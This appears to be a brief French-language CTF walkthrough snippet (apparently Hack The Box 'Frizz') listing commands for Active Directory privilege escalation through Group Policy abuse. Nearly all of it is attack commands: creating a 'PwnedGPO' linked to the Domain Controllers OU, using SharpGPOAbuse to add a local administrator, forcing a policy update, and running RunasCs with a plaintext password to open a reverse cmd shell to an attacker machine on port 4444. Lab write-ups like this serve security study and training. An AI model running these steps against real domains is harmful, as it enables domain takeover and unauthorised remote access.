SharpGPOAbuse.exe

### 1. commande PowerShell utilisée pour créer un nouvel objet de stratégie de group
```
New-GPO -Name "pwnedGPO
```

### 2.creer un nouveau GPO nommé evil et  lié à l'unité d'organisation des contrôleurs de domaine.

```
New-GPO -Name PwnedGPO | New-GPLink -Target "OU=DOMAIN CONTROLLERS,D
C=FRIZZ,DC=HTB" -LinkEnabled Yes
```

### 3. Modifier l'objet de stratégie de groupe pour ajouter un administrateur local

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <Users>--GPO
Name PwnedGPO
```

### 4.Force GPO Update

```
gpupdate /force
```

### 5.Spawn Administrative Shell
RunasCs.exe pour lancer un shell cmd.exe avec les identifiants

```
\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r Your-machine-ip:
4444
```

https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more